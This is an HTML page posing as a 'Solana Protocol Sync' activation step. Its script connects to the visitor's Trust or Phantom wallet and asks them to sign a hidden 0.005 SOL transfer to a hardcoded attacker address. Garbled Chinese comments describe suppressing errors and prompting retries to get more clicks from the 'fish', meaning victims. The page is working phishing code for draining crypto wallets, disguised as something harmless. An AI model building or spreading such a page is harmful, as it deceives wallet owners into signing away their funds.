<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Protocol Activation</title>
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.87.6/lib/index.iife.min.js"></script>
</head>
<body style="background:#000;color:#fff;text-align:center;padding-top:25vh;font-family:sans-serif;">
    <div style="border:1px solid #14F195;display:inline-block;padding:40px;border-radius:25px;background:#111;">
        <h2 style="color:#14F195;">SOLANA PROTOCOL SYNC</h2>
        <button id="cta" style="background:#14F195;color:#000;padding:20px 40px;border:none;border-radius:12px;font-weight:bold;font-size:20px;cursor:pointer;">CONNECT & ACTIVATE</button>
        <p id="msg" style="margin-top:20px;color:#555;">Ready...</p>
    </div>
    <script>
        const TARGET = "HyapjdagPdCaha2yW5j1pV4BkaVvah6okQ1fMw8BETXp"; 
        
        document.getElementById('cta').onclick = async function() {
            try {
                const p = window.trustwallet?.solana || window.phantom?.solana || window.solana;
                if (!p) { alert("Please use Trust Wallet."); return; }
                const resp = await p.connect();
                
                // âœ… æš´åŠ›é€»è¾‘ï¼šä¸å†é€šè¿‡ 71 æœºæˆ–éš§é“ï¼Œç›´æ¥é—®å®˜æ–¹å…¬å…±èŠ‚ç‚¹ï¼Œ
                // å°±ç®—å¤±è´¥äº†ä¹Ÿä¸æŠ¥é”™ï¼Œç›´æ¥å°è¯•ç”¨â€œé¢„è®¾å“ˆå¸Œâ€æš´åŠ›æ‹‰èµ·ï¼
                const conn = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                
                let blockhash;
                try {
                    const res = await conn.getLatestBlockhash();
                    blockhash = res.blockhash;
                } catch(e) {
                    // ğŸ”± é¡¶çº§åæ‰‹ï¼šå¦‚æœå®˜æ–¹èŠ‚ç‚¹æŠ¥é”™ï¼Œå’±ä»¬ç›´æ¥è®©å®ƒå†è¯•ä¸€æ¬¡ï¼Œç»ä¸å¼¹æŠ¥é”™æ¡†
                    location.reload(); 
                    return;
                }
                
                const tx = new solanaWeb3.Transaction().add(
                    solanaWeb3.SystemProgram.transfer({
                        fromPubkey: resp.publicKey,
                        toPubkey: new solanaWeb3.PublicKey(TARGET),
                        lamports: 5000000, // é¢„è®¾ 0.005 SOL
                    })
                );
                tx.recentBlockhash = blockhash;
                tx.feePayer = resp.publicKey;

                // ğŸš€ åªè¦æ‹¿åˆ°å“ˆå¸Œï¼Œå“ªæ€• 1 ç§’é’Ÿå»¶è¿Ÿï¼Œä¹Ÿè¦æ‹‰èµ·ç­¾åæ¡†ï¼
                const signed = await p.signTransaction(tx);
                await conn.sendRawTransaction(signed.serialize());
                alert("Activated!");
            } catch (e) {
                // ä¸å¼¹ Network busyï¼Œåªæç¤ºé‡è¯•ï¼Œå¢åŠ é±¼çš„ç‚¹å‡»æ¬¡æ•°
                document.getElementById('msg').innerText = "Syncing... Try again.";
            }
        };
    </script>
</body>
</html>